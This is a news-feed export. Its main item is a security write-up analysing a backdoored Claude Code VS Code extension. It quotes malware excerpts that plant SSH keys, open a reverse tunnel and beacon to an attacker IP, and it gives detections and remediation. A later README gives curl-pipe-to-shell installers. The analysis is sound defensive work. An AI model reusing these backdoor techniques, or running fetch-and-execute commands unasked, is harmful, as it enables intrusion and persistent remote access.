            <title><![CDATA[Backdoor in Claude Code for VS Code extension on the Cursor Marketplace (188 pts)]]></title>
            <link>https://phorion.io/blog/offical-claude-code-vsx-compromise/</link>
            <guid>50300683</guid>
            <pubDate>Fri, 30 Oct 2026 07:09:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phorion.io/blog/offical-claude-code-vsx-compromise/">https://phorion.io/blog/offical-claude-code-vsx-compromise/</a>, See on <a href="https://news.ycombinator.com/item?id=50300683">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><section aria-label="TL;DR"><h2>TL;DR</h2><div><p>Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.</p><p>Organisations should immediately review their environments for use of Claude Code for VSCode <code>2.1.313</code> and engage incident response where use of the extension is discovered.</p></div></section><p>Phorion has discovered a compromise of the official <strong>Claude Code for VS Code</strong> extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the associated release from its marketplace, additionally pulling NPM and VSCode versions for <code>2.1.313</code> from their relevant registries.</p><p>While the implant includes setup and persistence logic for <strong>macOS, Linux, and Windows</strong>, we’re going to focus primarily on <strong>macOS</strong> in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.</p><p>The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.</p><p>Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, <code>systemsetup -getremotelogin</code> prints an administrator-access error and exits with status <code>0</code> instead of returning <code>Off</code>. Because the script only tries to enable SSH if the output matches <code>Off</code>, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.</p><p>In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.</p><h2 id="infection-chain">Infection Chain</h2><h3 id="the-cursor-marketplace-extension">The Cursor Marketplace Extension</h3><p>The compromised <code>extension.js</code> file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal <code>activate</code> and <code>deactivate</code> exports, and UI code.</p><p>The injected prefix pulls in standard Node.js modules (<code>child_process</code>, <code>fs</code>, <code>os</code>, <code>path</code>, <code>http</code>, and <code>crypto</code>) and executes as soon as Node loads the file, before the extension’s normal <code>activate</code> callback even runs. The user doesn’t need to interact with the extension for the payload to fire.</p><h3 id="stage-1---preparing-ssh-access">Stage 1 - Preparing SSH Access</h3><p>First, the payload makes sure <code>~/.ssh</code> exists and appends an attacker-controlled Ed25519 public key to <code>~/.ssh/authorized_keys</code>, setting permissions to <code>0700</code> on the directory and <code>0600</code> on the file.</p><p>The key uses the comment <code>svc-telemetry</code>. Before appending, the script checks whether <code>svc-telemetry</code> is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>var</span> sd <span>=</span> path.join(HOME, <span>".ssh"</span>),
</span></span><span><span>    ak <span>=</span> path.join(sd, <span>"authorized_keys"</span>);
</span></span><span><span><span>// ...
</span></span></span><span><span><span>if</span> (cur.indexOf(<span>"svc-telemetry"</span>) <span>&lt;</span> <span>0</span>) {
</span></span><span><span>  fs.appendFileSync(ak, PUB <span>+</span> <span>"\n"</span>);
</span></span><span><span>  d.sshKey <span>=</span> <span>"added"</span>
</span></span><span><span>} <span>else</span> {
</span></span><span><span>  d.sshKey <span>=</span> <span>"present"</span>
</span></span><span><span>}
</span></span></code></pre></div><p>Here, <code>cur</code> holds the existing contents of <code>authorized_keys</code>, and <code>PUB</code> is the embedded attacker public key (redacted here).</p><p>With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:</p><ul><li><strong>Linux:</strong> tries to enable and start <code>sshd</code> or <code>ssh</code> via <code>systemctl</code>, falling back to <code>service</code> and <code>/etc/init.d/</code>.</li><li><strong>macOS:</strong> checks Remote Login and, if it reports <code>Off</code>, tries to enable it via <code>sudo -n systemsetup -setremotelogin on</code>.</li><li><strong>Windows:</strong> tries to install and start OpenSSH Server using PowerShell.</li></ul><p>None of these steps include a privilege escalation exploit. Non-interactive <code>sudo -n</code> will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.</p><p>It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (<code>det()</code>) that hardcodes <code>/bin/sh</code>, which isn’t going to get very far on a standard Windows install.</p><h3 id="a-bug-in-the-macos-ssh-logic">A bug in the macOS SSH logic?</h3><p>On macOS, the setup may run into problems before it even gets to the <code>sudo</code> command. The script runs <code>systemsetup -getremotelogin</code> without elevation and tests the output against <code>/Off/i</code>. It only tries to enable Remote Login if the output contains <code>Off</code>:</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>// ...
</span></span></span><span><span><span>else</span> <span>if</span> (PLAT <span>===</span> <span>"darwin"</span>) {
</span></span><span><span>  <span>var</span> rl <span>=</span> ex(<span>"systemsetup -getremotelogin 2&gt;/dev/null"</span>, <span>4000</span>);
</span></span><span><span>  d.remoteLogin <span>=</span> rl;
</span></span><span><span>  <span>if</span> (<span>/Off/i</span>.test(rl)) {
</span></span><span><span>    det(<span>"sudo -n systemsetup -setremotelogin on &gt;/dev/null 2&gt;&amp;1"</span>);
</span></span><span><span>    d.remoteLoginOn <span>=</span> <span>"tried"</span>
</span></span><span><span>  }
</span></span><span><span>}
</span></span></code></pre></div><p>Notice that the second command (<code>-setremotelogin on</code>) uses <code>sudo -n</code>, while the first command (<code>-getremotelogin</code>) doesn’t. When you run <code>systemsetup -getremotelogin</code> as a standard user on macOS, you get this instead:</p><div><pre tabindex="0"><code data-lang="text"><span><span>You need administrator access to run this tool... exiting!
</span></span></code></pre></div><p><code>systemsetup</code> refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status <code>0</code>. The malware’s <code>ex()</code> helper grabs stdout and returns it:</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>function</span> ex(c, t) {
</span></span><span><span>  <span>try</span> {
</span></span><span><span>    <span>return</span> cp.execSync(c, {
</span></span><span><span>      timeout<span>:</span> t <span>||</span> <span>3000</span>,
</span></span><span><span>      stdio<span>:</span> [<span>"ignore"</span>, <span>"pipe"</span>, <span>"ignore"</span>],
</span></span><span><span>      windowsHide<span>:</span> <span>true</span>
</span></span><span><span>    }).toString().trim()
</span></span><span><span>  } <span>catch</span> (e) {
</span></span><span><span>    <span>return</span> <span>""</span>
</span></span><span><span>  }
</span></span><span><span>}
</span></span></code></pre></div><p>Because the output is <code>"You need administrator access to run this tool... exiting!"</code>, <code>/Off/i.test(rl)</code> evaluates to <code>false</code>.</p><p>As a result, the script skips the <code>if</code> block and never runs <code>sudo -n systemsetup -setremotelogin on</code>. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.</p><blockquote><p><strong>This bug can break the final step of the access chain.</strong> If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.</p></blockquote><p>Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.</p><h3 id="stage-2---establishing-the-reverse-ssh-tunnel">Stage 2 - Establishing the Reverse SSH Tunnel</h3><p>Next, the script sets up an outbound SSH connection to <code>134.209.82[.]225</code> as the <code>tunnel</code> user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment <code>svc-telemetry-tun</code>.</p><p>It’s worth keeping the two keys straight during an investigation:</p><ul><li>The public key added to <code>~/.ssh/authorized_keys</code> (<code>svc-telemetry</code>) lets the attacker log into the victim’s machine.</li><li>The embedded private key (<code>svc-telemetry-tun</code>) lets the victim’s machine connect out to the attacker’s tunnel server.</li></ul><p>The script writes this tunnel key to the OS temporary directory with a filename starting with <code>.stk_</code>, followed by the first ten characters of the MD5 hash of the hostname and home directory path:</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>var</span> kf <span>=</span> path.join(
</span></span><span><span>  TMP,
</span></span><span><span>  <span>".stk_"</span> <span>+</span> crypto.createHash(<span>"md5"</span>)
</span></span><span><span>    .update(<span>String</span>(os.hostname()) <span>+</span> HOME).digest(<span>"hex"</span>).slice(<span>0</span>, <span>10</span>)
</span></span><span><span>);
</span></span><span><span><span>// ...
</span></span></span><span><span><span>var</span> RF <span>=</span> (PLAT <span>===</span> <span>"win32"</span>) <span>?</span> <span>"\"*:0:localhost:22\""</span> <span>:</span> <span>"'*:0:localhost:22'"</span>;
</span></span></code></pre></div><p>The tunnel uses <code>-R *:0:localhost:22</code> for remote port forwarding. Passing <code>0</code> asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to <code>localhost:22</code> on the victim’s machine:</p><div><pre tabindex="0"><code data-lang="text"><span><span>Affected host -- outbound SSH tunnel --&gt; External SSH server
</span></span><span><span>
</span></span><span><span>Operator -- separate connection --&gt; Server's allocated port
</span></span><span><span>                                            |
</span></span><span><span>                                 Through the existing tunnel
</span></span><span><span>                                            |
</span></span><span><span>                                            v
</span></span><span><span>                                  Affected host's SSH:22
</span></span><span><span>                                            |
</span></span><span><span>                                  Login using the planted key
</span></span></code></pre></div><p>Because the tunnel runs with <code>-N</code>, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.</p><p>The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, <code>known_hosts</code> is ignored, <code>BatchMode</code> and <code>IdentitiesOnly</code> are enabled, keepalives are set to 30 seconds (<code>ServerAliveCountMax=3</code>), and <code>ExitOnForwardFailure</code> is turned on.</p><p>If <code>autossh</code> is installed, the script uses it; otherwise it falls back to standard <code>ssh</code>. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using <code>pgrep</code> on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.</p><h3 id="stage-3---keeping-access-available">Stage 3 - Keeping Access Available</h3><p>To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:</p><div><table><thead><tr><th>Platform</th><th>Artifacts</th><th>Persistence mechanism</th><th>Notes</th></tr></thead><tbody><tr><td>Linux</td><td><code>~/.config/.smt</code>, <code>~/.config/.smtk</code></td><td>Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an <code>@reboot</code> entry to the user’s crontab.</td><td>Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).</td></tr><tr><td>macOS</td><td><code>~/.config/.smt</code>, <code>~/.config/.smtk</code>, <code>~/Library/LaunchAgents/com.apple.sysmond.plist</code></td><td>Writes a user LaunchAgent that runs <code>/bin/sh ~/.config/.smt</code> with <code>RunAtLoad</code> and <code>KeepAlive</code> set to <code>true</code>, then loads it via <code>launchctl</code>.</td><td>Runs in the user context rather than as a root LaunchDaemon.</td></tr><tr><td>Windows</td><td><code>~/.config/smt.cmd</code>, <code>~/.config/smtk</code>, <code>%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd</code></td><td>Tries to create a scheduled task named <code>SysMon</code> running as <code>SYSTEM</code> on startup. If that fails, drops <code>sysmon.cmd</code> into the user’s Startup folder.</td><td>Creating a <code>SYSTEM</code> task requires admin privileges; the Startup folder fallback runs as the user at login.</td></tr></tbody></table></div><p>On macOS and Linux, the <code>~/.config/.smt</code> script has the tunnel private key embedded inside it and writes it out to <code>~/.config/.smtk</code> before starting the reconnection loop.</p><p>On macOS, the LaunchAgent disguises itself as <code>com.apple.sysmond.plist</code> inside <code>~/Library/LaunchAgents/</code>:</p><div><pre tabindex="0"><code data-lang="xml"><span><span><span>&lt;key&gt;</span>Label<span>&lt;/key&gt;</span>
</span></span><span><span><span>&lt;string&gt;</span>com.apple.sysmond<span>&lt;/string&gt;</span>
</span></span><span><span><span>&lt;!-- ... --&gt;</span>
</span></span><span><span><span>&lt;key&gt;</span>RunAtLoad<span>&lt;/key&gt;</span>
</span></span><span><span><span>&lt;true/&gt;</span>
</span></span><span><span><span>&lt;key&gt;</span>KeepAlive<span>&lt;/key&gt;</span>
</span></span><span><span><span>&lt;true/&gt;</span>
</span></span></code></pre></div><h3 id="stage-4---host-recon">Stage 4 - Host Recon</h3><p>Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:</p><ul><li>Hostname, username, OS platform, and architecture</li><li>Home directory, current working directory, and global Git email (<code>git config --global user.email</code>)</li><li>Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)</li><li>Up to 40 environment variable <strong>names</strong> (not values) matching <code>/KEY|TOKEN|SECRET|PASS|AWS|GCP/i</code></li></ul><p>The environment variable check uses <code>Object.keys(process.env)</code>:</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>Object</span>.keys(process.env)
</span></span><span><span>  .filter(<span>function</span>(k) {
</span></span><span><span>    <span>return</span> <span>/KEY|TOKEN|SECRET|PASS|AWS|GCP/i</span>.test(k)
</span></span><span><span>  })
</span></span><span><span>  .slice(<span>0</span>, <span>40</span>)
</span></span></code></pre></div><p>Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.</p><p>To get the machine’s public IP, the script queries <code>ifconfig[.]me</code>, falling back to <code>api[.]ipify[.]org</code>.</p><p>It then sends the JSON report via plaintext HTTP POST requests to <code>/beacon</code> on both <code>134.209.82[.]225:8099</code> and <code>127.0.0.1:8099</code>:</p><div><pre tabindex="0"><code data-lang="javascript"><span><span><span>var</span> r <span>=</span> http.request({
</span></span><span><span>  host<span>:</span> h,
</span></span><span><span>  port<span>:</span> p,
</span></span><span><span>  path<span>:</span> <span>"/beacon"</span>,
</span></span><span><span>  method<span>:</span> <span>"POST"</span>,
</span></span><span><span>  timeout<span>:</span> <span>3000</span>,
</span></span><span><span>  headers<span>:</span> {<span>"content-type"</span><span>:</span> <span>"application/json"</span>}
</span></span><span><span>}, <span>function</span>(res) {
</span></span><span><span>  res.resume()
</span></span><span><span>});
</span></span><span><span><span>// ...
</span></span></span><span><span>r.write(JSON.stringify(d));
</span></span><span><span>r.end()
</span></span></code></pre></div><p>Why it also sends a copy of the beacon to <code>127.0.0.1:8099</code> isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.</p><p>The beacon is scheduled once with <code>setTimeout</code> (1.5 seconds after the initial setup runs) and discards any HTTP response with <code>res.resume()</code>. It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.</p><h2 id="detection-opportunities">Detection Opportunities</h2><p>From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.</p><h3 id="ssh-key-and-configuration-changes">SSH Key and Configuration Changes</h3><p>Because the malware appends to <code>~/.ssh/authorized_keys</code> directly using Node’s <code>fs.appendFileSync</code>, process-only rules watching for shell commands like <code>echo</code> or <code>tee</code> touching <code>authorized_keys</code> won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (<code>Code Helper</code>, <code>Cursor Helper</code>, etc.) creating or writing to <code>~/.ssh/authorized_keys</code>.</p><p>Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.</p><p>While you should also monitor for <code>systemsetup -setremotelogin on</code>, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.</p><h3 id="user-launchagent-persistence">User LaunchAgent Persistence</h3><p>The persistence setup on macOS gives us a couple of strong signals:</p><ul><li>A non-Apple process writing a plist with a <code>com.apple.*</code> label (<code>~/Library/LaunchAgents/com.apple.sysmond.plist</code>).</li><li>A LaunchAgent configured to execute <code>/bin/sh</code> against a hidden script in the user’s home directory (<code>~/.config/.smt</code>).</li></ul><p>Because the initial tunnel is spawned as a detached process and <code>launchd</code> later manages <code>.smt</code> directly, the subsequent <code>ssh</code> processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of <code>.smt</code> and <code>com.apple.sysmond.plist</code> back to the IDE extension host makes it much easier to piece the chain together.</p><h3 id="ssh-tunnels-and-follow-on-access">SSH Tunnels and Follow-On Access</h3><p>On the process and network side, look for:</p><ul><li><code>ssh</code> or <code>autossh</code> launched with remote port forwarding (<code>-R *:0:localhost:22</code>) and identity files pulled from <code>/tmp/.stk_*</code> or <code>~/.config/.smtk</code>.</li><li>Outbound SSH connections to <code>134.209.82[.]225</code> on port 22, alongside HTTP POST requests to <code>134.209.82[.]225:8099</code> (and connection attempts to <code>127.0.0.1:8099</code>).</li></ul><p>If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from <code>localhost</code> (<code>127.0.0.1</code> or <code>::1</code>) authenticating with the <code>svc-telemetry</code> key.</p><h3 id="remediation">Remediation</h3><p>If you identify an affected machine, <strong>uninstalling the extension alone won’t remove the backdoor</strong>. Make sure your response covers all of the stages it drops:</p><ol><li><strong>Kill active tunnel processes:</strong> Terminate the <code>/bin/sh</code> retry loop and any <code>ssh</code> or <code>autossh</code> processes connecting to <code>134.209.82[.]225</code>.</li><li><strong>Remove persistence:</strong> Unload and delete <code>~/Library/LaunchAgents/com.apple.sysmond.plist</code> on macOS (or clean up the <code>@reboot</code> cron entry on Linux / <code>SysMon</code> scheduled task and Startup script on Windows), and remove <code>~/.config/.smt</code> and <code>~/.config/.smtk</code>.</li><li><strong>Clean up SSH keys and state:</strong> Remove the <code>svc-telemetry</code> public key from <code>~/.ssh/authorized_keys</code>, delete <code>/tmp/.stk_*</code>, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.</li><li><strong>Rotate credentials:</strong> If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the <code>KEY|TOKEN|SECRET|PASS|AWS|GCP</code> environment variable filter).</li></ol><h2 id="phorions-approach">Phorion’s Approach</h2><p>Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating <code>com.apple.*</code> LaunchAgents and LaunchAgents executing shell scripts from hidden directories.</p><p>Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying <code>~/.ssh/authorized_keys</code> directly, and <a href="https://phorion.io/blog/phorion-protections/">Phorion Protections</a> can be used to lock down <code>~/.ssh/</code> so that only authorised processes can read or modify SSH keys and configuration files in the first place.</p><p>If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, <a href="#cta">get in touch to arrange a demo</a>.</p><h2 id="indicators">Indicators</h2><h3 id="sample-and-public-key-fingerprints">Sample and Public-Key Fingerprints</h3><div><table><thead><tr><th>Indicator</th><th>Value</th><th>Notes</th></tr></thead><tbody><tr><td>SHA-256</td><td><code>ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15</code></td><td>Backdoored <code>extension.js</code> bundle</td></tr><tr><td>Victim-login public-key fingerprint</td><td><code>SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk</code></td><td>Ed25519 key appended to <code>~/.ssh/authorized_keys</code> (comment <code>svc-telemetry</code>)</td></tr><tr><td>Tunnel public-key fingerprint</td><td><code>SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ</code></td><td>Embedded Ed25519 key used to authenticate to the tunnel server (comment <code>svc-telemetry-tun</code>)</td></tr></tbody></table></div><h3 id="network-indicators">Network Indicators</h3><div><table><thead><tr><th>Indicator</th><th>Type</th><th>Notes</th></tr></thead><tbody><tr><td><code>134.209.82[.]225</code> (TCP <code>22</code>, user <code>tunnel</code>)</td><td>IP / SSH</td><td>Outbound reverse SSH tunnel server</td></tr><tr><td><code>134.209.82[.]225:8099</code> (<code>POST /beacon</code>)</td><td>IP / HTTP</td><td>External host-report beacon endpoint</td></tr><tr><td><code>127.0.0.1:8099</code> (<code>POST /beacon</code>)</td><td>Loopback / HTTP</td><td>Local beacon destination</td></tr><tr><td><code>ifconfig[.]me</code>, <code>api[.]ipify[.]org</code></td><td>Domain</td><td>Legitimate services queried for public IP discovery</td></tr></tbody></table></div><h3 id="host-artifacts">Host Artifacts</h3><div><table><thead><tr><th>Artifact</th><th>Platform</th><th>Notes</th></tr></thead><tbody><tr><td><code>~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.313-darwin-arm64</code></td><td>macOS (Apple Silicon)</td><td>Installed extension directory (<code>&lt;ide&gt;</code> varies by editor)</td></tr><tr><td><code>~/.ssh/authorized_keys</code> (comment <code>svc-telemetry</code>)</td><td>All</td><td>Planted Ed25519 public key</td></tr><tr><td><code>&lt;TMP&gt;/.stk_&lt;10 hex chars&gt;</code> (<code>$TMPDIR/.stk_*</code> on macOS)</td><td>All</td><td>Initial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of <code>MD5(hostname + HOME)</code>)</td></tr><tr><td><code>~/.config/.smt</code> and <code>~/.config/.smtk</code></td><td>macOS, Linux</td><td>Persistence shell script and recreated tunnel private key</td></tr><tr><td><code>~/Library/LaunchAgents/com.apple.sysmond.plist</code></td><td>macOS</td><td>User LaunchAgent executing <code>/bin/sh ~/.config/.smt</code></td></tr><tr><td><code>@reboot</code> cron entry for <code>~/.config/.smt</code></td><td>Linux</td><td>User crontab persistence</td></tr><tr><td><code>~/.config/smt.cmd</code> and <code>~/.config/smtk</code></td><td>Windows</td><td>Persistence batch script and tunnel private key</td></tr><tr><td>Scheduled task <code>SysMon</code></td><td>Windows</td><td>Startup scheduled task (requests <code>SYSTEM</code>)</td></tr><tr><td><code>%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd</code></td><td>Windows</td><td>Startup folder fallback script</td></tr></tbody></table></div></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pico CSS is no longer maintained (174 pts)]]></title>
            <link>https://github.com/picocss/pico/discussions/754</link>
            <guid>50298964</guid>
            <pubDate>Fri, 30 Oct 2026 01:58:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/picocss/pico/discussions/754">https://github.com/picocss/pico/discussions/754</a>, See on <a href="https://news.ycombinator.com/item?id=50298964">Hacker News</a></p>
<div id="readability-page-1" class="page"><div disabled="" sortable="">
        <p dir="auto"><a href="https://github.com/picocss/pico/releases/tag/v2.1.1">v2.1.1</a> is the final release.</p>
<p dir="auto"><strong>Why</strong><br>
Today, AI can generate lightweight, standalone, accessible HTML with just the CSS it needs, so a Minimal CSS Framework for Semantic HTML matters less than it used to. To stay relevant, Pico CSS would need a full rewrite: plain modern CSS instead of Sass, built on features it doesn't use today (OKLCH colors, cascade layers, Popover, anchor positioning) with fallbacks for older browsers, and a native compiler that strips unused CSS and makes customization easy. That would be a different project. Pico CSS stays as it is.</p>
<p dir="auto"><strong>What this means</strong></p>
<ul dir="auto">
<li>Nothing breaks. <a href="https://www.npmjs.com/package/@picocss/pico" rel="nofollow">npm</a>, the <a href="https://www.jsdelivr.com/package/npm/@picocss/pico" rel="nofollow">jsDelivr CDN</a> and <a href="https://picocss.com/" rel="nofollow">picocss.com</a> stay online for the long term.</li>
<li>The repositories are archived. No new issues, PRs or releases.</li>
<li>Pico CSS is <a href="https://github.com/picocss/pico/blob/main/LICENSE.md">MIT licensed</a>. You're free to fork it and take it further. See <a href="https://github.com/picocss/pico/forks">community forks</a>.</li>
<li>The Pico CSS name and logo are not covered by the MIT license. Please give your fork its own name, so users don't confuse it with the original.</li>
</ul>
<p dir="auto"><strong>Thank you</strong><br>
What started as a small side project ended up powering thousands of websites. Thank you to everyone who used it, opened issues, sent pull requests and wrote kind messages over the years.</p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Herdr has released native app (299 pts)]]></title>
            <link>https://github.com/herdrdev/herdr-app</link>
            <guid>50298436</guid>
            <pubDate>Fri, 30 Oct 2026 00:42:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/herdrdev/herdr-app">https://github.com/herdrdev/herdr-app</a>, See on <a href="https://news.ycombinator.com/item?id=50298436">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true" containertiming="hpc"><article itemprop="text">
<p dir="auto">Herdr is a desktop app for terminals and coding agents. Keep work in spaces, see which agents need you, and leave terminals running when you close the window.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Install</h2><a id="user-content-install" aria-label="Permalink: Install" href="#install"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Linux and macOS</h3><a id="user-content-linux-and-macos" aria-label="Permalink: Linux and macOS" href="#linux-and-macos"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="curl -fsSL https://releases.herdr.dev/app/install.sh | sh"><pre>curl -fsSL https://releases.herdr.dev/app/install.sh <span>|</span> sh</pre></div>
<p dir="auto">Linux needs a desktop session and a working Vulkan driver. macOS builds are available for Apple Silicon; Intel Mac users can <a href="#build-from-source">build from source</a>. Linux builds are x86-64 and ARM64.</p>
<p dir="auto">The installer adds Herdr to your apps and puts the command in <code>~/.local/bin</code>.
Add that folder to your PATH if the installer asks.
On macOS the app lives in <code>~/Applications/Herdr.app</code>.
For drag-and-drop installation on Apple Silicon, download <a href="https://releases.herdr.dev/app/Herdr.dmg" rel="nofollow">Herdr.dmg</a> and drag Herdr to Applications.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Windows</h3><a id="user-content-windows" aria-label="Permalink: Windows" href="#windows"></a></p>
<p dir="auto">Run in PowerShell on x64 Windows with curl and tar installed (Windows 10 1803 or newer):</p>
<div dir="auto" data-snippet-clipboard-copy-content="irm https://releases.herdr.dev/app/install.ps1 | iex"><pre>irm https:<span>//</span>releases.herdr.dev<span>/</span>app<span>/</span>install.ps1 <span>|</span> iex</pre></div>
<p dir="auto">Herdr appears in the Start menu. The installer adds <code>%LOCALAPPDATA%\Programs\herdr-app</code> to your user PATH. Open a new terminal to pick it up.</p>
<p dir="auto">Both installers download and run code. Read the <a href="https://github.com/herdrdev/herdr-app/blob/master/distribution/install.sh">shell installer</a> or <a href="https://github.com/herdrdev/herdr-app/blob/master/distribution/install.ps1">PowerShell installer</a> first if you prefer.
They also install <a href="https://github.com/herdrdev/herdr-core">herdr-core</a> if it is missing.
The app can help install or update a core it cannot use.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Find your work</h2><a id="user-content-find-your-work" aria-label="Permalink: Find your work" href="#find-your-work"></a></p>
<p dir="auto">A <strong>space</strong> holds work on one machine, usually in one repo. Each space has <strong>tabs</strong>. Split a tab into <strong>panes</strong> to put terminals or mod panels beside each other.</p>
<p dir="auto">An unnamed space follows its first terminal's folder. Name a space or tab when you want a label that stays.
New tabs start in the focused terminal's folder.</p>
<p dir="auto">The agents sidebar brings agents from your spaces into one list, including workers started by another agent.
Agents that report status show as:</p>
<ul dir="auto">
<li><strong>Working:</strong> still busy.</li>
<li><strong>Blocked:</strong> waiting for you.</li>
<li><strong>Done:</strong> finished while you were looking elsewhere.</li>
<li><strong>Idle:</strong> not working, or a finished agent you have looked at.</li>
</ul>
<p dir="auto">Click an agent to see it. A worker without a pane opens in <strong>peek</strong>, over your tab. Keep it as a tab if you want it beside your other work.
Ctrl-click a live terminal address in terminal text to peek at it; use Cmd-click on macOS.
An address such as <code>t7</code> means a terminal on the same machine as the terminal showing it. <code>vps/t7</code> names one on another machine.</p>
<p dir="auto">The window arranges terminals. The core runs them.
Closing the window leaves them running; closing a pane or tab ends its terminals.
After a reboot or core crash, kept panes get fresh shells in their last folders, not their old programs.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Work on another machine</h2><a id="user-content-work-on-another-machine" aria-label="Permalink: Work on another machine" href="#work-on-another-machine"></a></p>
<p dir="auto">Add an SSH machine from Settings → Machines or the sidebar's Add machine action.
Pick a host from your SSH config or type how SSH reaches it.
Spaces on that machine run their terminals there, not on your computer.</p>
<p dir="auto">Each machine keeps its spaces, tabs and splits in its core. Connected screens share that structure and the live terminals, but keep their own focus and zoom.
Remote work keeps running when your local window closes or your laptop sleeps, as long as the remote machine and core stay up.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Make it yours</h2><a id="user-content-make-it-yours" aria-label="Permalink: Make it yours" href="#make-it-yours"></a></p>
<p dir="auto">Open the command palette to find an action by name, or open Settings to change fonts, colors, sounds and other preferences.
The built-in layouts include Herdr, Terminals and Herdr 98.
A <strong>layout</strong> arranges the window. <strong>Mods</strong> are small JavaScript programs that draw its panels, menus and dialogs.</p>
<p dir="auto">Duplicate a shipped layout or mod before changing its structure or code. Your copies stay yours; Herdr updates the shipped ones on start.
Save a personal layout, mod or key file and the window reloads it.
A broken edit keeps the last good version and reports the error.</p>
